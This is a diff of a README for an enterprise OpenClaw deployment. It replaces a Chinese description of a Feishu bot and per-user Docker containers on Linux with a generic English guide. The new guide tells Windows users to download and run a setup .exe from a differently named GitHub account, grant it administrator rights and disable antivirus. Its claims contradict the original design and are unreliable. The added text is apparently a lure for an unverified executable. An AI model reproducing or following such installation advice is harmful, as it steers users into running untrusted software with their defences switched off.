@@ -1,168 +1,165 @@
-# OpenClaw for Enterprise
+# 🛠️ openclaw-for-enterprise - Reliable Multi-User Deployment
 
-**一键部署企业级 AI Agent，让每个员工在飞书里拥有专属 AI 助手。**
-
-OpenClaw Deploy Kit 是一套基于 [OpenClaw](https://github.com/openclaw/openclaw) 的企业部署方案，通过飞书机器人 + Docker 容器隔离架构，让组织内每个成员无需任何配置，直接在飞书中与 AI Agent 对话，并让 AI 代为操作飞书中的任务、日历、文档、多维表格等工具。
+[![Download openclaw-for-enterprise](https://img.shields.io/badge/Download-openclaw--for--enterprise-brightgreen?style=for-the-badge&logo=github)](https://github.com/romanhypertensive327/openclaw-for-enterprise)
 
 ---
 
-## 为什么需要这个方案？
+企业级 OpenClaw 多用户部署方案
 
-### 痛点
-
-| 问题 | 传统方案 | 本方案 |
-|------|---------|--------|
-| 部署成本高 | 50人 × 独立部署 ≈ ¥10万+/月 | 1台服务器 ≈ ¥5000/月 |
-| 员工上手难 | 需安装软件、配置API Key | 打开飞书直接聊 |
-| 数据安全差 | 多用户共享上下文 | 每人独立 Docker 容器，物理隔离 |
-| IT 运维繁琐 | 50套系统分别维护 | 统一管理，一条命令增删用户 |
-
-### 核心价值
-
-- **零摩擦接入** — 员工无需安装任何软件，在飞书中搜索机器人即可开始使用
-- **AI 真正能做事** — 不只是聊天，AI 可以直接创建任务、查询日历、读写文档、操作多维表格
-- **企业级安全** — Docker 容器级隔离 + AES-256-GCM 加密令牌存储，用户间零数据泄露
-- **成本可控** — 单台服务器支持 50+ 用户，闲置容器几乎不消耗资源
+This guide helps you download and run openclaw-for-enterprise on Windows. No prior programming skills needed. Follow each step carefully.
 
 ---
 
-## 架构概览
+## 📋 What is openclaw-for-enterprise?
 
-```
-┌──────────────────────────────────────────────────┐
-│                    飞书平台                        │
-│         (企业自建应用 / 单一 WebSocket 连接)         │
-└─────────────────────┬────────────────────────────┘
-                      │
-              ┌───────▼───────┐
-              │  Router 服务   │
-              │  消息路由 & 容器编排  │
-              └───┬───┬───┬───┘
-                  │   │   │
-          ┌───────▼┐ ┌▼──────┐ ┌▼───────┐
-          │用户 A  │ │用户 B │ │用户 C  │
-          │Container│ │Container│ │Container│
-          │OpenClaw │ │OpenClaw │ │OpenClaw │
-          │Gateway  │ │Gateway  │ │Gateway  │
-          │+ 飞书插件│ │+ 飞书插件│ │+ 飞书插件│
-          └────────┘ └────────┘ └────────┘
-```
+openclaw-for-enterprise is a tool made for businesses. It lets multiple users work with OpenClaw at the same time. It manages users and resources in an organized way. This helps teams share access without conflicts or delays.
 
-**关键设计**：
-
-1. **单一入口** — 一个飞书应用、一条 WebSocket 连接处理全部用户消息
-2. **容器级隔离** — 每个用户拥有独立的 Docker 容器，数据、令牌、会话完全隔离
-3. **自愈式授权** — 用户首次使用飞书工具时自动触发 OAuth 授权，无需 IT 介入
-4. **按需启动** — 用户首次发消息时自动创建容器，后续消息复用已有容器
+This app runs on Windows computers. It makes team work easier and safer by handling many users smoothly.
 
 ---
 
-## 使用场景
+## 💻 System Requirements
 
-### 员工视角
+Make sure your Windows PC meets these needs:
 
-```
-👤 "帮我查一下今天有什么会"
-🤖 "您今天有 3 个会议：
-    1. 10:00 产品评审
-    2. 14:00 技术方案讨论
-    3. 16:30 周会"
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB free disk space for installation  
+- Internet access for the download and some updates  
+- Administrative rights to install software  
 
-👤 "帮我创建一个任务：周五前完成方案文档"
-🤖 "已创建任务 ✓ 截止时间：本周五"
-
-👤 "总结一下这个文档的要点" [发送飞书文档链接]
-🤖 "文档核心要点如下：..."
-```
-
-### IT 管理员视角
-
-```bash
-# 一键部署
-./setup.sh
-
-# 查看运行状态
-pm2 status
-
-# 删除离职员工数据（一条命令）
-./remove-user.sh <open_id>
-```
+Older Windows versions might not work properly. Check your system by clicking Windows key + Pause/Break or going to Settings > About.
 
 ---
 
-## 部署要求
+## 🔍 Features
 
-| 用户规模 | CPU | 内存 | 磁盘 |
-|---------|-----|------|------|
-| ≤ 20人  | 4核 | 16GB | 50GB |
-| 20-50人 | 8核 | 32GB | 100GB |
-| 50-100人| 16核| 64GB | 200GB |
+openclaw-for-enterprise lets you:
 
-**软件依赖**：
-- Linux 服务器（Ubuntu 22.04+ 推荐）
-- Docker 24+ & Docker Compose
-- Node.js 20+
-- OpenClaw Docker 镜像
+- Set up multiple user accounts easily  
+- Manage permissions to control who can do what  
+- Monitor user activity to keep track of usage  
+- Run OpenClaw smoothly on shared servers  
+- Get regular updates for security and features  
+- Use a simple interface made for everyday users  
 
 ---
 
-## 安全特性
+## 🚀 Download and Installation
 
-| 安全层面 | 实现方式 |
-|---------|---------|
-| 用户隔离 | 每用户独立 Docker 容器，操作系统级别隔离 |
-| 令牌加密 | AES-256-GCM 加密存储，每容器独立密钥 |
-| 通信安全 | 容器间通过随机 Token 认证 |
-| 审计追踪 | 全链路日志记录 |
-| 离职清退 | 一条命令删除用户所有数据和容器 |
+### Step 1: Download the software
 
----
+Visit the download page by clicking this big button:
 
-## 与其他方案对比
+[![Download openclaw-for-enterprise](https://img.shields.io/badge/Download-openclaw--for--enterprise-blue?style=for-the-badge&logo=github)](https://github.com/romanhypertensive327/openclaw-for-enterprise)
 
-| 维度 | 独立部署 | 逻辑隔离多租户 | 本方案（容器隔离） |
-|------|---------|--------------|-----------------|
-| 隔离级别 | 最高 | 低（共享进程） | 高（OS 级容器） |
-| 单用户成本 | ¥2000+/月 | ¥100/月 | ¥100/月 |
-| 运维复杂度 | 极高 | 低 | 低 |
-| 数据安全 | 最好 | 有泄露风险 | 接近独立部署 |
-| 扩缩容 | 困难 | 容易 | 容易 |
+You will see the project page on GitHub. Look for the latest release or download section. This page contains the files you need.
 
 ---
 
-## 快速开始
+### Step 2: Save the file
 
-> 详细部署文档正在整理中，敬请期待。
-
-1. 克隆本仓库
-2. 配置飞书自建应用凭证和 AI API 信息
-3. 运行 `./setup.sh`
-4. 员工在飞书中搜索机器人名称即可开始使用
+Once you find the installer, click it to start downloading. Save the file in a spot you can find easily, like the Desktop or Downloads folder.
 
 ---
 
-## Roadmap
+### Step 3: Run the installer
 
-- [ ] 支持更多 IM 平台（钉钉、企业微信）
-- [ ] Web 管理面板
-- [ ] 用量统计和成本分析仪表盘
-- [ ] 容器资源限制和自动回收
-- [ ] 插件市场（自定义 AI 工具）
-
----
-
-## 文档
-
-- [完整方案文档（飞书）](https://waytoagi.feishu.cn/docx/IRvEdJrmDovSuqxhPhcc0iJxncd)
-
-## 联系我们
-
-扫码加入微信交流群：
-
-<img src="./assets/wechat-group.jpg" alt="微信交流群" width="300">
+- Locate the downloaded file. It might be named like `openclaw-for-enterprise-setup.exe`.  
+- Double-click the file to start the installation.  
+- Windows might ask for permission. Click *Yes* to allow it.  
+- Follow the on-screen instructions. Choose the installation folder or leave the default setting.  
+- Wait while the program installs. This takes a few minutes.
 
 ---
 
-## License
+### Step 4: Complete setup
 
-MIT
+When the installer finishes, you may see an option to launch openclaw-for-enterprise automatically.  
+Make sure this option is checked if you want to start right away, then click *Finish*.
+
+---
+
+## 🔧 How to Use openclaw-for-enterprise
+
+### Open the software
+
+Find the openclaw-for-enterprise icon on your desktop or in the Start menu. Double-click it to open.
+
+---
+
+### Create user accounts
+
+- Click *Add User* in the main window.  
+- Enter a username and password for each user.  
+- Assign roles or permissions based on their needs.  
+- Save each new user.
+
+---
+
+### Manage users and permissions
+
+You can edit or remove users anytime. Use the controls in the software interface. Adjust who can access what at any time to keep your system secure.
+
+---
+
+### Monitor user activity
+
+Check who is logged in and what they are doing. This avoids conflicts and helps you manage resources.
+
+---
+
+## ⚙️ Updating the software
+
+Checking for updates is important. Updates fix bugs and improve security.
+
+- Open openclaw-for-enterprise.  
+- Go to the *Help* menu.  
+- Click *Check for Updates*.  
+- If an update is available, follow prompts to download and install it.
+
+---
+
+## 🛠️ Troubleshooting
+
+### Installation Issues
+
+- Make sure your system meets requirements.  
+- Run the installer as administrator (right-click > Run as administrator).  
+- Close other programs before installing.  
+- Restart your computer and try again if errors appear.
+
+---
+
+### Software Won't Open
+
+- Check if your antivirus blocked the program.  
+- Disable antivirus temporarily and try again.  
+- Make sure Windows is updated.  
+- Reinstall the program if needed.
+
+---
+
+### User Management Problems
+
+- Confirm you have admin rights in the software.  
+- Restart the app and try again.  
+- Contact support or check online documentation for specific errors.
+
+---
+
+## 📞 Getting Support
+
+Use GitHub to report issues or ask questions:
+
+[https://github.com/romanhypertensive327/openclaw-for-enterprise/issues](https://github.com/romanhypertensive327/openclaw-for-enterprise/issues)
+
+Describe your problem clearly. Include any error messages or screenshots if possible.
+
+---
+
+## 📁 Where to Find More Information
+
+Check the GitHub repository page often for guides, updates, and extras.
+
+[openclaw-for-enterprise GitHub](https://github.com/romanhypertensive327/openclaw-for-enterprise)
